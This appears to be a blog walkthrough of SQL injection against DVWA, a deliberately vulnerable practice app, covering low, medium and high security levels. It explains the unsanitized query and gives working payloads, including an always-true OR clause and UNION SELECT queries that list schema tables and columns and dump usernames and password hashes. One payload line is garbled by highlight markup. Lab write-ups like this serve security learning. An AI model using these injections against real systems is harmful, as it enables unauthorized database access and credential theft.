
Before we begin, we need to ensure that our DVWA security setting is low.

![](https://miro.medium.com/v2/resize:fit:875/1*IAxj-notA6V0rR1eUoz86w.png)

![](https://miro.medium.com/v2/resize:fit:875/1*NlI8462tHeDAuMjRfDDdCQ.png)

source code

The flaw in the code you provided is that it is vulnerable to SQL injection attacks. The vulnerability arises from directly concatenating user input into the SQL query without proper sanitization or parameterization.

Here’s an explanation of the flaw and the recommended solution:

In the code, the variable `$id` is retrieved from the user input without any validation or sanitization. It is then directly concatenated into the SQL query string:

```shell
$id = $_REQUEST['id'];  
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

This allows an attacker to manipulate the value of `$id` and inject malicious SQL code, potentially leading to unauthorized access, data leakage, or even complete loss of data.

![](https://miro.medium.com/v2/resize:fit:860/1*FusC7q2Kc-9sxi1wxAOJWw.png)

This means that the query that was executed back in the database was the following:

==1'== ==OR== =='1'========='1'====#==

![](https://miro.medium.com/v2/resize:fit:575/0*egMjdu5mbW6de-Z0.png)

```sql
'UNION SELECT table_name, NULL FROM information_schema.tables --
```

![](https://miro.medium.com/v2/resize:fit:875/0*ZA4GdY7MYiy7GYjx.png)

```sql
'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' --
```

![](https://miro.medium.com/v2/resize:fit:875/0*1QbwSRIV3MEtI9mg.png)

Now we can see we got both username and encrypted password.

```sql
'UNION SELECT user, password FROM users --
```

![](https://miro.medium.com/v2/resize:fit:716/0*FkVgF4mtYTbQegKe.png)

# Medium

We will intercept the request and send it to the repeater.

![](https://miro.medium.com/v2/resize:fit:529/0*Cy5xuFOO2Zb3jN8-.png)

![](https://miro.medium.com/v2/resize:fit:875/0*9B88s5gKdis9mjkb.png)

Edit id=1 to this code then send it and we can see the results in response.

```sql
1 UNION SELECT user, password FROM users --
```


![](https://miro.medium.com/v2/resize:fit:875/0*FwC4JRBwW19CUAc7.png)

# High

For high level, after clicking the “here to change your ID”, we can see a window where we can insert our malicious code.

![](https://miro.medium.com/v2/resize:fit:713/0*f-p1kRubsUY3WH8D.png)

```sql
' UNION SELECT user, password FROM users --
```

![](https://miro.medium.com/v2/resize:fit:875/0*RAcxqYXxuojPJLjT.png)

After submitting the code, we can get usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:873/0*BWGnasm8voTLe3eH.png)
